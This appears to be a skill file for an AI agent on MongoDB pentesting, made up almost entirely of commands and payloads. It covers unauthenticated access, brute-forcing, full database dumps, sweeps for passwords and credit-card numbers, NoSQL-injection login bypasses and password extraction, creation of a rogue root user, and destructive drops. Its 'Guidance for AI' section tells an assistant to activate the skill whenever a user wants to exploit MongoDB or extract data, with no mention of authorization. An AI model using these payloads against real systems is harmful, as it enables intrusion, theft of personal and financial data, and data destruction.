# MongoDB Pentesting Skill

## Goal

Exploit MongoDB databases to extract data, gain unauthorized access, and potentially achieve code execution.

## Methodology

1. **Discovery**: Identify MongoDB services
2. **Authentication Check**: Test for unauthenticated access
3. **Enumeration**: List databases, collections, users
4. **Data Extraction**: Dump sensitive data
5. **Exploitation**: SSRF, injection, or code execution

## Ports

- 27017/TCP: MongoDB
- 27018/TCP: MongoDB shard
- 27019/TCP: MongoDB config server
- 28017/TCP: MongoDB web interface (older versions)

## Tools

* **mongosh/mongo**: MongoDB shell
* **nmap**: MongoDB scripts
* **mongoaudit**: MongoDB security audit
* **mongodump**: Backup tool

## Example Commands

```bash
# Check for unauthenticated access
mongo target:27017
mongosh "mongodb://target:27017"

# Nmap detection
nmap -p27017 --script mongodb-* target
nmap -p27017 --script mongodb-info target
nmap -p27017 --script mongodb-databases target
nmap -p27017,27018,27019 --script mongodb-brute target

# With authentication
mongo target:27017 -u admin -p password --authenticationDatabase admin
mongosh "mongodb://admin:password@target:27017/admin"
```

## MongoDB Enumeration

```javascript
// List databases
show dbs

// Use a database
use database_name

// List collections
show collections
db.getCollectionNames()

// Get database stats
db.stats()

// List users
db.getUsers()
show users

// Get server info
db.serverStatus()
db.hostInfo()

// Get current operations
db.currentOp()

// Get build info
db.buildInfo()
```

## Data Extraction

```javascript
// Count documents in collection
db.collection_name.count()

// Find all documents
db.collection_name.find()
db.collection_name.find().pretty()

// Find with limit
db.collection_name.find().limit(100)

// Search specific field
db.collection_name.find({"username": "admin"})

// Search for passwords
db.collection_name.find({"password": {$exists: true}})

// Export collection
mongoexport --host target --db database --collection collection --out output.json

// Dump entire database
mongodump --host target --db database --out ./dump/

// Dump all databases
mongodump --host target --out ./dump/
```

## Sensitive Data Search

```javascript
// Search all collections for passwords
db.getCollectionNames().forEach(function(c) {
    results = db[c].find({"password": {$exists: true}});
    while(results.hasNext()) {
        printjson(results.next());
    }
});

// Search for string patterns
db.collection.find({$where: "JSON.stringify(this).indexOf('password') > -1"})

// Search for credit cards
db.collection.find({"cc": {$regex: /^4[0-9]{15}$/}})

// Search for emails
db.collection.find({"email": {$regex: /@/}})
```

## NoSQL Injection

```javascript
// If user input is not sanitized:

// Login bypass
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": "admin", "password": {"$gt": ""}}

// Extract data character by character
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^ab"}}

// In URL:
/login?username=admin&password[$ne]=x
/login?username[$gt]=&password[$gt]=

// Extract fields
{"$where": "this.password.charAt(0) == 'a'"}
```

## Server-Side JavaScript Injection

```javascript
// If $where operator accepts user input (older MongoDB)
{"$where": "function() { return this.username == 'admin'; }"}

// Sleep-based detection
{"$where": "sleep(5000) || true"}

// Command execution (very old versions)
{"$where": "new Date(this.timestamp).getTime() > 0"}
```

## Write Operations (if accessible)

```javascript
// Insert document
db.collection.insertOne({"key": "value"})

// Modify user password
db.users.updateOne({"username": "admin"}, {$set: {"password": "newpass"}})

// Create admin user
db.createUser({user: "hacker", pwd: "password", roles: ["root"]})

// Delete data (destructive!)
db.collection.deleteMany({})
db.dropDatabase()
```

## Metasploit Modules

```bash
# Information gathering
use auxiliary/scanner/mongodb/mongodb_login

# Enumeration
use auxiliary/gather/mongodb_js_injection
```

## Configuration Files

```bash
# Linux
/etc/mongod.conf
/var/lib/mongodb/

# Windows
C:\Program Files\MongoDB\Server\<version>\bin\mongod.cfg
C:\data\db\
```

## Common Vulnerabilities

```bash
# Unauthenticated access (most common!)
# Default config has no authentication

# REST interface exposed (older versions)
curl http://target:28017/

# SSRF via $lookup (MongoDB 3.6+)
# Can reach internal services

# $where injection (older versions)
# Server-side JavaScript execution
```

## Guidance for AI

* Activate this skill when user wants to exploit MongoDB or extract data
* **MongoDB often has no authentication** - try direct access first
* Default installation allows unauthenticated access
* `show dbs` requires listDatabases privilege (or unauthenticated)
* Look for:
  - User credentials
  - Session tokens
  - Application data
  - Configuration data
* NoSQL injection via operators ($ne, $gt, $regex)
* mongodump is fastest way to extract large amounts of data
* Web interface (port 28017) in older versions can be exploited
* Check for replica sets - may have different security settings
* MongoDB Atlas (cloud) has better default security
